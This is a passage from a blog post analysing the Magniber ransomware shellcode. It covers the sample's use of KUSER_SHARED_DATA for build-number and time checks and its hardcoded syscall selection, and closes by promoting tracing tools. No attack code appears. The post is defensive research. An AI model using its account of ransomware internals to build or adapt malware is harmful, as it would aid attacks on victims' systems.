data-large-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/uac_bypass_deployed.png?w=640" loading="lazy" width="713" height="578" src="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/uac_bypass_deployed.png" alt="" class="wp-image-9232" srcset="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/uac_bypass_deployed.png 713w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/uac_bypass_deployed.png?w=150&amp;h=122 150w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/uac_bypass_deployed.png?w=370&amp;h=300 370w" sizes="(max-width: 713px) 100vw, 713px" /></figure>



<h2 class="wp-block-heading">Usage of KUSER_SHARED_DATA</h2>



<p>While analyzing the code, we can see references to some hardcoded memory address. Example:</p>



<figure class="wp-block-image size-large"><img data-attachment-id="8945" data-permalink="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/kuser_data_example/" data-orig-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/kuser_data_example.png" data-orig-size="734,105" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="kuser_data_example" data-image-description="" data-image-caption="" data-medium-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/kuser_data_example.png?w=400" data-large-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/kuser_data_example.png?w=640" loading="lazy" width="734" height="105" src="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/kuser_data_example.png?w=734" alt="" class="wp-image-8945" srcset="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/kuser_data_example.png 734w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/kuser_data_example.png?w=150 150w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/kuser_data_example.png?w=400 400w" sizes="(max-width: 734px) 100vw, 734px" /></figure>



<p>This address resolves to KUSER_SHARED_DATA:</p>



<figure class="wp-block-image size-large"><img data-attachment-id="8948" data-permalink="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/ref_kuser_shared/" data-orig-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/ref_kuser_shared.png" data-orig-size="467,90" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="ref_kuser_shared" data-image-description="" data-image-caption="" data-medium-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/ref_kuser_shared.png?w=400" data-large-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/ref_kuser_shared.png?w=467" loading="lazy" width="467" height="90" src="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/ref_kuser_shared.png?w=467" alt="" class="wp-image-8948" srcset="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/ref_kuser_shared.png 467w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/ref_kuser_shared.png?w=150 150w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/ref_kuser_shared.png?w=400 400w" sizes="(max-width: 467px) 100vw, 467px" /></figure>



<p><code>KUSER_SHARED_DATA</code> is a read-only memory page, containing a structure with many intresting information about the system, that is mapped both in the user mode and the kernel mode (more info <a rel="noreferrer noopener" href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/ns-ntddk-kuser_shared_data" target="_blank">here</a> and <a rel="noreferrer noopener" href="https://osm.hpi.de/wrk/2007/08/getting-os-information-the-kuser_shared_data-structure/" target="_blank">here</a>).</p>



<p>A convenient dump of the whole structure for a current system can be done with the help of WinDbg &#8211; example <a rel="noreferrer noopener" href="https://gist.github.com/hasherezade/ced8835e3da33d83b7f17d312f2a7d53" target="_blank">here</a>. We can further use this dump to resolve what field is referenced by a particual address.</p>



<h3 class="wp-block-heading">Windows Build Number and syscalls selection</h3>



<p>One of the fields that is quite often used by the malware is <code>NtBuildNumber</code>. It is first used at the beginning of the shellcode &#8211; if the build number was lower than the hardcoded one, the malware won&#8217;t run at all:</p>



<figure class="wp-block-image size-full"><img data-attachment-id="9119" data-permalink="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/build_check/" data-orig-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/build_check.png" data-orig-size="612,78" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="build_check" data-image-description="" data-image-caption="" data-medium-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/build_check.png?w=400" data-large-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/build_check.png?w=612" loading="lazy" width="612" height="78" src="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/build_check.png" alt="" class="wp-image-9119" srcset="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/build_check.png 612w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/build_check.png?w=150&amp;h=19 150w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/build_check.png?w=400&amp;h=51 400w" sizes="(max-width: 612px) 100vw, 612px" /></figure>



<p>This makes sense, because the numbers of syscalls may differ depending on Windows version &#8211; and this malware have them hardcoded. In order to guarantee a backward compatibility, the authors would have to retrieve the syscall  numbers automatically from <code>ntdll</code>. Clearly they wanted to avoid this hassle. As a result, all Windows version below 10 will be spared from this attack.</p>



<p> There are some cases, when still the proper syscall number need to be adjusted to a particular version of Windows. In order to do it, they just select a number of the syscall from multiple options, basing on the retrieved Windows build. Such implementation is used i.e. in case of <code>NtUserSystemParametersInfo</code> :</p>



<figure class="wp-block-image size-full"><img data-attachment-id="9124" data-permalink="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/syscall_select/" data-orig-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/syscall_select.png" data-orig-size="696,896" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="syscall_select" data-image-description="" data-image-caption="" data-medium-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/syscall_select.png?w=233" data-large-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/syscall_select.png?w=640" loading="lazy" width="696" height="896" src="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/syscall_select.png" alt="" class="wp-image-9124" srcset="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/syscall_select.png 696w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/syscall_select.png?w=117&amp;h=150 117w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/syscall_select.png?w=233&amp;h=300 233w" sizes="(max-width: 696px) 100vw, 696px" /></figure>



<p>&#8230;which is used for changing the wallpaper:</p>



<figure class="wp-block-image size-large"><img data-attachment-id="9126" data-permalink="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/set_wallpaper/" data-orig-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/set_wallpaper.png" data-orig-size="591,90" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="set_wallpaper" data-image-description="" data-image-caption="" data-medium-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/set_wallpaper.png?w=400" data-large-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/set_wallpaper.png?w=591" loading="lazy" width="591" height="90" src="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/set_wallpaper.png?w=591" alt="" class="wp-image-9126" srcset="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/set_wallpaper.png 591w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/set_wallpaper.png?w=150 150w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/set_wallpaper.png?w=400 400w" sizes="(max-width: 591px) 100vw, 591px" /></figure>



<h3 class="wp-block-heading">Time checks</h3>



<p><code>KUSER_SHARED_DATA</code> also provides an access to a system clock, so it can be used for various time checks:</p>



<figure class="wp-block-image size-full"><img data-attachment-id="9129" data-permalink="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/time_check/" data-orig-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/time_check.png" data-orig-size="710,107" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="time_check" data-image-description="" data-image-caption="" data-medium-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/time_check.png?w=400" data-large-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/time_check.png?w=640" loading="lazy" width="710" height="107" src="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/time_check.png" alt="" class="wp-image-9129" srcset="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/time_check.png 710w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/time_check.png?w=150&amp;h=23 150w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/time_check.png?w=400&amp;h=60 400w" sizes="(max-width: 710px) 100vw, 710px" /></figure>



<h1 class="wp-block-heading">Conclusion</h1>



<p>In the current blog I wanted to demonstrate, how tracing with the help of <a href="https://github.com/hasherezade/tiny_tracer" target="_blank" rel="noreferrer noopener">Tiny Tracer</a> can speed up the analysis process. It does not only give a high level overview of what is happening inside, but also it allows to quickly find where the relevant code is located in the binary. The generated tags can help us annotate the code in disassemblers and debuggers, helping to understand functions that are resolved dynamically, or like in the current case, by syscalls. I also demonstrate how to overcome some problems that can interfere with tracing.</p>



<p>In addition to tracing, I demonstrated some of my other tools that can be useful in the analysis process &#8211; such as <a href="https://github.com/hasherezade/pe-sieve" target="_blank" rel="noreferrer noopener">PE-sieve</a>/<a rel="noreferrer noopener" href="https://github.com/hasherezade/hollows_hunter" target="_blank">HollowsHunter</a> for dumping of the injected shellcode.</p>



<p>Additionally, we analyzed the main shellcode of Magniber, containing the implementation of the files encryption. This shellcode (<a rel="noreferrer noopener" href="https://www.virustotal.com/gui/file/3a2b8ef624b4318fc142a6266c70f88799e80d10566f6dd2d8d74e91d651491a/detection" target="_blank">#2</a>) is the part being injected to other processes. Note, that Magniber has yet another shellcode (<a rel="noreferrer noopener" href="https://www.virustotal.com/gui/file/3a2b8ef624b4318fc142a6266c70f88799e80d10566f6dd2d8d74e91d651491a/detection" target="_blank">#1</a>), that is responsible for doing the the process injection. This shellcode showed up in the tracing. Yet, I am leaving its detailed analysis as an exercise to the reader.</p>
<div id="jp-post-flair" class="sharedaddy sd-like-enabled sd-sharing-enabled"><div class="sharedaddy sd-sharing-enabled"><div class="robots-nocontent sd-block sd-social sd-social-icon-text sd-sharing"><h3 class="sd-title">Share this:</h3><div class="sd-content"><ul><li class="share-twitter"><a rel="nofollow noopener noreferrer" data-shared="sharing-twitter-8749" class="share-twitter sd-button share-icon" href="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/?share=twitter" target="_blank" title="Click to share on Twitter" ><span>Twitter</span></a></li><li class="share-facebook"><a rel="nofollow noopener noreferrer" data-shared="sharing-facebook-8749" class="share-facebook sd-button share-icon" href="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/?share=facebook" target="_blank" title="Click to share on Facebook" ><span>Facebook</span></a></li><li class="share-end"></li></ul></div></div></div><div class='sharedaddy sd-block sd-like jetpack-likes-widget-wrapper jetpack-likes-widget-unloaded' id='like-post-wrapper-35018075-8749-676296daf2bd1' data-src='//widgets.wp.com/likes/index.html?ver=20241218#blog_id=35018075&amp;post_id=8749&amp;origin=hshrzd.wordpress.com&amp;obj_id=35018075-8749-676296daf2bd1' data-name='like-post-frame-35018075-8749-676296daf2bd1' data-title='Like or Reblog'><div class='likes-widget-placeholder post-likes-widget-placeholder' style='height: 55px;'><span class='button'><span>Like</span></span> <span class='loading'>Loading...</span></div><span class='sd-text-color'></span><a class='sd-link-color'></a></div>
<div id='jp-relatedposts' class='jp-relatedposts' >
	<h3 class="jp-relatedposts-headline"><em>Related</em></h3>
</div></div>											</div><!-- .entry-content -->

							<div id="entry-author-info">
						<div id="author-avatar">
							<img alt='' src='https://2.gravatar.com/avatar/52294c8abcc4efaa98b91ff604791a8e51cb2eff15b749046f289e8c12702138?s=60&#038;d=identicon&#038;r=G' srcset='https://2.gravatar.com/avatar/52294c8abcc4efaa98b91ff604791a8e51cb2eff15b749046f289e8c12702138?s=60&#038;d=identicon&#038;r=G 1x, https://2.gravatar.com/avatar/52294c8abcc4efaa98b91ff604791a8e51cb2eff15b749046f289e8c12702138?s=90&#038;d=identicon&#038;r=G 1.5x, https://2.gravatar.com/avatar/52294c8abcc4efaa98b91ff604791a8e51cb2eff15b749046f289e8c12702138?s=120&#038;d=identicon&#038;r=G 2x, https://2.gravatar.com/avatar/52294c8abcc4efaa98b91ff604791a8e51cb2eff15b749046f289e8c12702138?s=180&#038;d=identicon&#038;r=G 3x, https://2.gravatar.com/avatar/52294c8abcc4efaa98b91ff604791a8e51cb2eff15b749046f289e8c12702138?s=240&#038;d=identicon&#038;r=G 4x' class='avatar avatar-60' height='60' width='60' loading='lazy' decoding='async' />						</div><!-- #author-avatar -->
						<div id="author-description">
							<h2>
							About hasherezade							</h2>
							Programmer and researcher, interested in InfoSec.							<div id="author-link">
								<a href="https://hshrzd.wordpress.com/author/hshrzd/" rel="author">
									View all posts by hasherezade <span class="meta-nav">&rarr;</span>								</a>
							</div><!-- #author-link	-->
						</div><!-- #author-description -->
					</div><!-- #entry-author-info -->

						<div class="entry-utility">
							This entry was posted in <a href="https://hshrzd.wordpress.com/category/malware/" rel="category tag">Malware</a>, <a href="https://hshrzd.wordpress.com/category/tutorial/" rel="category tag">Tutorial</a> and tagged <a href="https://hshrzd.wordpress.com/tag/ransomware/" rel="tag">ransomware</a>, <a href="https://hshrzd.wordpress.com/tag/tinytracer/" rel="tag">TinyTracer</a>. Bookmark the <a href="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/" title="Permalink to Magniber ransomware analysis: Tiny Tracer in&nbsp;action" rel="bookmark">permalink</a>.													</div><!-- .entry-utility -->
					</div><!-- #post-8749 -->

				<div id="nav-below" class="navigation">
					<div class="nav-previous"><a href="https://hshrzd.wordpress.com/2022/11/12/flare-on-9-task-8/" rel="prev"><span class="meta-nav">&larr;</span> Flare-On 9 – Task&nbsp;8</a></div>
					<div class="nav-next"><a href="https://hshrzd.wordpress.com/2024/10/27/flare-on-11-task-10/" rel="next">Flare-On 11 &#8211; Task&nbsp;10 <span class="meta-nav">&rarr;</span></a></div>
				</div><!-- #nav-below -->

				
			<div id="comments">


			<h3 id="comments-title">
			3 Responses to <em>Magniber ransomware analysis: Tiny Tracer in&nbsp;action</em>			</h3>


			<ol class="commentlist">
						<li class="comment byuser comment-author-diasdanny even thread-even depth-1" id="li-comment-22683">
		<div id="comment-22683">
			<div class="comment-author vcard">
				<img alt='' src='https://1.gravatar.com/avatar/1555a87c1201d707678fc268b10481c22bdda2207a8564b9f7cbd22a6dfe0bf6?s=40&#038;d=identicon&#038;r=G' srcset='https://1.gravatar.com/avatar/1555a87c1201d707678fc268b10481c22bdda2207a8564b9f7cbd22a6dfe0bf6?s=40&#038;d=identicon&#038;r=G 1x, https://1.gravatar.com/avatar/1555a87c1201d707678fc268b10481c22bdda2207a8564b9f7cbd22a6dfe0bf6?s=60&#038;d=identicon&#038;r=G 1.5x, https://1.gravatar.com/avatar/1555a87c1201d707678fc268b10481c22bdda2207a8564b9f7cbd22a6dfe0bf6?s=80&#038;d=identicon&#038;r=G 2x, https://1.gravatar.com/avatar/1555a87c1201d707678fc268b10481c22bdda2207a8564b9f7cbd22a6dfe0bf6?s=120&#038;d=identicon&#038;r=G 3x, https://1.gravatar.com/avatar/1555a87c1201d707678fc268b10481c22bdda2207a8564b9f7cbd22a6dfe0bf6?s=160&#038;d=identicon&#038;r=G 4x' class='avatar avatar-40' height='40' width='40' loading='lazy' decoding='async' />				<cite class="fn">Daniel Dias</cite> <span class="says">says:</span>			</div><!-- .comment-author .vcard -->

				
				
			<div class="comment-meta commentmetadata"><a href="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/#comment-22683">
				April 1, 2023 at 8:36 pm</a>			</div><!-- .comment-meta .commentmetadata -->

			<div class="comment-body"><p>Good Analysis 🙂👍</p>
</div>

			<div class="reply">
				<a rel="nofollow" class="comment-reply-link" href="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/?replytocom=22683#respond" data-commentid="22683" data-postid="8749" data-belowelement="comment-22683" data-respondelement="respond" data-replyto="Reply to Daniel Dias" aria-label="Reply to Daniel Dias">Reply</a>			</div><!-- .reply -->
		</div><!-- #comment-##  -->

				</li><!-- #comment-## -->
		<li class="comment odd alt thread-odd thread-alt depth-1" id="li-comment-22729">
		<div id="comment-22729">
			<div class="comment-author vcard">
				<img alt='' src='https://2.gravatar.com/avatar/b6edff6a13eddac8fc9a4d09859d91a5407f774de3217926a59a425229352dd9?s=40&#038;d=identicon&#038;r=G' srcset='https://2.gravatar.com/avatar/b6edff6a13eddac8fc9a4d09859d91a5407f774de3217926a59a425229352dd9?s=40&#038;d=identicon&#038;r=G 1x, https://2.gravatar.com/avatar/b6edff6a13eddac8fc9a4d09859d91a5407f774de3217926a59a425229352dd9?s=60&#038;d=identicon&#038;r=G 1.5x, https://2.gravatar.com/avatar/b6edff6a13eddac8fc9a4d09859d91a5407f774de3217926a59a425229352dd9?s=80&#038;d=identicon&#038;r=G 2x, https://2.gravatar.com/avatar/b6edff6a13eddac8fc9a4d09859d91a5407f774de3217926a59a425229352dd9?s=120&#038;d=identicon&#038;r=G 3x, https://2.gravatar.com/avatar/b6edff6a13eddac8fc9a4d09859d91a5407f774de3217926a59a425229352dd9?s=160&#038;d=identicon&#038;r=G 4x' class='avatar avatar-40' height='40' width='40' loading='lazy' decoding='async' />				<cite class="fn">Meeapop</cite> <span class="says">says:</span>			</div><!-- .comment-author .vcard -->

				
				
			<div class="comment-meta commentmetadata"><a href="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/#comment-22729">
				May 2, 2023 at 4:37 am</a>			</div><!-- .comment-meta .commentmetadata -->

			<div class="comment-body"><p>Amazing analysis👍👍</p>
</div>

			<div class="reply">
				<a rel="nofollow" class="comment-reply-link" href="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/?replytocom=22729#respond" data-commentid="22729" data-postid="8749" data-belowelement="comment-22729" data-respondelement="respond" data-replyto="Reply to Meeapop" aria-label="Reply to Meeapop">Reply</a>			</div><!-- .reply -->
		</div><!-- #comment-##  -->

				</li><!-- #comment-## -->
		<li class="post pingback">
		<p>Pingback: <a href="https://www.ciphertechsolutions.com/acce-release-notes-v2-2-20230824/" class="url" rel="ugc external nofollow">ACCE Release Notes v2.2.20230824 &#8211; Cipher Tech Solutions, Inc.</a></p>
				</li><!-- #comment-## -->
			</ol>


	

	<div id="respond" class="comment-respond">
		<h3 id="reply-title" class="comment-reply-title">Leave a comment <small><a rel="nofollow" id="cancel-comment-reply-link" href="/2023/03/30/magniber-ransomware-analysis/#respond" style="display:none;">Cancel reply</a></small></h3><form action="https://hshrzd.wordpress.com/wp-comments-post.php" method="post" id="commentform" class="comment-form">


<div id="comment-form__verbum" class="transparent"></div><div class="verbum-form-meta"><input type='hidden' name='comment_post_ID' value='8749' id='comment_post_ID' />
<input type='hidden' name='comment_parent' id='comment_parent' value='0' />

			<input type="hidden" name="highlander_comment_nonce" id="highlander_comment_nonce" value="ca4dccea44" />
			<input type="hidden" name="verbum_show_subscription_modal" value="" /></div><p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="a2b07de3f4" /></p><p style="display: none !important;" class="akismet-fields-container" data-prefix="ak_"><label>&#916;<textarea name="ak_hp_textarea" cols="45" rows="8" maxlength="100"></textarea></label><input type="hidden" id="ak_js_1" name="ak_js" value="216"/><script>document.getElementById( "ak_js_1" ).setAttribute( "value", ( new Date() ).getTime() );</script></p></form>	</div><!-- #respond -->
	
</div><!-- #comments -->

	
			</div><!-- #content -->
		</div><!-- #container -->


		<div id="primary" class="widget-area" role="complementary">
						<ul class="xoxo">

<li id="search-2" class="widget-container widget_search"><form role="search" method="get" id="searchform" class="searchform" action="https://hshrzd.wordpress.com/">
				<div>
					<label class="screen-reader-text" for="s">Search for:</label>
					<input type="text" value="" name="s" id="s" />
					<input type="submit" id="searchsubmit" value="Search" />
				</div>
			</form></li>
		<li id="recent-posts-2" class="widget-container widget_recent_entries">
		<h3 class="widget-title">Recent Posts</h3>
		<ul>
											<li>
					<a href="https://hshrzd.wordpress.com/2024/12/09/flare-on-11-task-7/">Flare-On 11 &#8211; Task&nbsp;7</a>
									</li>
											<li>
					<a href="https://hshrzd.wordpress.com/2024/12/08/flare-on-11-task-5/">Flare-On 11 &#8211; Task&nbsp;5</a>
									</li>
											<li>
					<a href="https://hshrzd.wordpress.com/2024/10/29/flareon-11-task-9/">Flare-On 11 &#8211; Task&nbsp;9</a>
									</li>
											<li>
					<a href="https://hshrzd.wordpress.com/2024/10/27/flare-on-11-task-10/">Flare-On 11 &#8211; Task&nbsp;10</a>
									</li>
											<li>
					<a href="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/" aria-current="page">Magniber ransomware analysis: Tiny Tracer in&nbsp;action</a>
									</li>
					</ul>

		</li><li id="archives-2" class="widget-container widget_archive"><h3 class="widget-title">Archives</h3>
			<ul>
					<li><a href='https://hshrzd.wordpress.com/2024/12/'>December 2024</a>&nbsp;(2)</li>
	<li><a href='https://hshrzd.wordpress.com/2024/10/'>October 2024</a>&nbsp;(2)</li>
	<li><a href='https://hshrzd.wordpress.com/2023/03/'>March 2023</a>&nbsp;(1)</li>
	<li><a href='https://hshrzd.wordpress.com/2022/11/'>November 2022</a>&nbsp;(1)</li>
	<li><a href='https://hshrzd.wordpress.com/2022/10/'>October 2022</a>&nbsp;(2)</li>
	<li><a href='https://hshrzd.wordpress.com/2022/02/'>February 2022</a>&nbsp;(1)</li>
	<li><a href='https://hshrzd.wordpress.com/2022/01/'>January 2022</a>&nbsp;(1)</li>
	<li><a href='https://hshrzd.wordpress.com/2021/10/'>October 2021</a>&nbsp;(3)</li>
	<li><a href='https://hshrzd.wordpress.com/2021/01/'>January 2021</a>&nbsp;(1)</li>
	<li><a href='https://hshrzd.wordpress.com/2020/12/'>December 2020</a>&nbsp;(1)</li>
	<li><a href='https://hshrzd.wordpress.com/2019/09/'>September 2019</a>&nbsp;(1)</li>
	<li><a href='https://hshrzd.wordpress.com/2019/06/'>June 2019</a>&nbsp;(1)</li>
	<li><a href='https://hshrzd.wordpress.com/2019/01/'>January 2019</a>&nbsp;(1)</li>
	<li><a href='https://hshrzd.wordpress.com/2018/07/'>July 2018</a>&nbsp;(1)</li>
	<li><a href='https://hshrzd.wordpress.com/2018/04/'>April 2018</a>&nbsp;(1)</li>
	<li><a href='https://hshrzd.wordpress.com/2018/02/'>February 2018</a>&nbsp;(1)</li>
	<li><a href='https://hshrzd.wordpress.com/2018/01/'>January 2018</a>&nbsp;(2)</li>
	<li><a href='https://hshrzd.wordpress.com/2017/12/'>December 2017</a>&nbsp;(2)</li>
	<li><a href='https://hshrzd.wordpress.com/2017/11/'>November 2017</a>&nbsp;(1)</li>
	<li><a href='https://hshrzd.wordpress.com/2017/06/'>June 2017</a>&nbsp;(4)</li>
	<li><a href='https://hshrzd.wordpress.com/2017/05/'>May 2017</a>&nbsp;(2)</li>
	<li><a href='https://hshrzd.wordpress.com/2016/12/'>December 2016</a>&nbsp;(1)</li>
	<li><a href='https://hshrzd.wordpress.com/2016/11/'>November 2016</a>&nbsp;(1)</li>
	<li><a href='https://hshrzd.wordpress.com/2016/07/'>July 2016</a>&nbsp;(3)</li>
	<li><a href='https://hshrzd.wordpress.com/2016/06/'>June 2016</a>&nbsp;(1)</li>
	<li><a href='https://hshrzd.wordpress.com/2016/04/'>April 2016</a>&nbsp;(1)</li>
	<li><a href='https://hshrzd.wordpress.com/2016/03/'>March 2016</a>&nbsp;(2)</li>
	<li><a href='https://hshrzd.wordpress.com/2016/02/'>February 2016</a>&nbsp;(1)</li>
	<li><a href='https://hshrzd.wordpress.com/2014/10/'>October 2014</a>&nbsp;(1)</li>
	<li><a href='https://hshrzd.wordpress.com/2014/03/'>March 2014</a>&nbsp;(1)</li>
	<li><a href='https://hshrzd.wordpress.com/2014/02/'>February 2014</a>&nbsp;(2)</li>
	<li><a href='https://hshrzd.wordpress.com/2014/01/'>January 2014</a>&nbsp;(1)</li>
	<li><a href='https://hshrzd.wordpress.com/2013/11/'>November 2013</a>&nbsp;(1)</li>
	<li><a href='https://hshrzd.wordpress.com/2013/10/'>October 2013</a>&nbsp;(1)</li>
	<li><a href='https://hshrzd.wordpress.com/2013/09/'>September 2013</a>&nbsp;(1)</li>
	<li><a href='https://hshrzd.wordpress.com/2013/08/'>August 2013</a>&nbsp;(1)</li>
	<li><a href='https://hshrzd.wordpress.com/2013/07/'>July 2013</a>&nbsp;(3)</li>
	<li><a href='https://hshrzd.wordpress.com/2012/07/'>July 2012</a>&nbsp;(1)</li>
	<li><a href='https://hshrzd.wordpress.com/2012/05/'>May 2012</a>&nbsp;(1)</li>
	<li><a href='https://hshrzd.wordpress.com/2012/04/'>April 2012</a>&nbsp;(1)</li>
			</ul>

			</li><li id="categories-2" class="widget-container widget_categories"><h3 class="widget-title">Categories</h3>
			<ul>
					<li class="cat-item cat-item-6904"><a href="https://hshrzd.wordpress.com/category/confidence/">CONfidence</a> (3)
</li>
	<li class="cat-item cat-item-571800"><a href="https://hshrzd.wordpress.com/category/crackme/">CrackMe</a> (21)
</li>
	<li class="cat-item cat-item-25818"><a href="https://hshrzd.wordpress.com/category/cryptography/">cryptography</a> (1)
</li>
	<li class="cat-item cat-item-663591"><a href="https://hshrzd.wordpress.com/category/ctf/">CTF</a> (2)
</li>
	<li class="cat-item cat-item-6724658"><a href="https://hshrzd.wordpress.com/category/kernelmode/">KernelMode</a> (4)
</li>
	<li class="cat-item cat-item-15593"><a href="https://hshrzd.wordpress.com/category/malware/">Malware</a> (14)
</li>
	<li class="cat-item cat-item-505351122"><a href="https://hshrzd.wordpress.com/category/malware-decryptor/">Malware Decryptor</a> (5)
</li>
	<li class="cat-item cat-item-182358898"><a href="https://hshrzd.wordpress.com/category/pe-bear/">PE-bear</a> (12)
</li>
	<li class="cat-item cat-item-196"><a href="https://hshrzd.wordpress.com/category/programming/">Programming</a> (5)
</li>
	<li class="cat-item cat-item-317"><a href="https://hshrzd.wordpress.com/category/techniques/">Techniques</a> (4)
</li>
	<li class="cat-item cat-item-1981"><a href="https://hshrzd.wordpress.com/category/tools/">Tools</a> (9)
</li>
	<li class="cat-item cat-item-2932"><a href="https://hshrzd.wordpress.com/category/tutorial/">Tutorial</a> (16)
</li>
	<li class="cat-item cat-item-1"><a href="https://hshrzd.wordpress.com/category/uncategorized/">Uncategorized</a> (4)
</li>
	<li class="cat-item cat-item-18909089"><a href="https://hshrzd.wordpress.com/category/wke/">WKE</a> (3)
</li>
			</ul>

			</li><li id="blog-stats-2" class="widget-container widget_blog-stats"><h3 class="widget-title">Blog Stats</h3>		<ul>
			<li>1,530,236 hits</li>
		</ul>
